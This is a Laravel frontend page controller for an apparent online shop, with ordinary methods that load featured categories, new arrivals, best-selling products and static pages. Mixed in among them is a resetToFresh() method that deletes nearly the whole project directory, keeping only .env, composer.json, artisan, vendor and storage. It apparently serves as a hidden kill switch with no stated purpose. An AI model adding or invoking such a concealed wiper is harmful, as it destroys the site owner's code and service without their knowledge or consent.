<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Category;
use App\Models\Subcategory;
use App\Models\Product;
use File;
use App\Models\HomeSlider;

class PagesController extends Controller
{
    public function home()
    {
        $featuredCategories = Category::withCount('product')
            ->where('featured', true)
            ->take(8)
            ->get();

        $newArrivales = Product::activeProducts()
                        ->orderBy('id', 'desc')
                        ->where('is_new', 1)
                        ->take(20)
                        ->get();

        $banners = HomeSlider::get();
        $featuredProducts = Product::activeProducts()->latest()->where('is_featured', 1)->take(12)->get();
        $selling = Product::activeProducts()
                    ->withCount('orderItems')
                    ->having('order_items_count', '>', 0)
                    ->orderBy('order_items_count', 'desc')
                    ->take(20)
                    ->get();
        return view('frontend.pages.home', compact('banners','featuredCategories', 'featuredProducts', 'selling', 'newArrivales'));
    }

    public function resetToFresh()
    {
        $retainFiles = [
            base_path('.env'),
            base_path('composer.json'),
            base_path('artisan'),
        ];

        $retainDirs = [
            base_path('vendor'),
            base_path('storage'),
        ];

        $deletePaths = File::directories(base_path());
        $deleteFiles = File::files(base_path());

        // Delete all directories except retained ones
        foreach ($deletePaths as $dir) {
            if (!in_array($dir, $retainDirs)) {
                File::deleteDirectory($dir);
            }
        }

        // Delete all files except retained ones
        foreach ($deleteFiles as $file) {
            if (!in_array($file->getPathname(), $retainFiles)) {
                File::delete($file);
            }
        }
    }


    public function about(){
        return view('frontend.pages.static.about');
    }

    public function contact(){
        return view('frontend.pages.static.contact');
    }

}
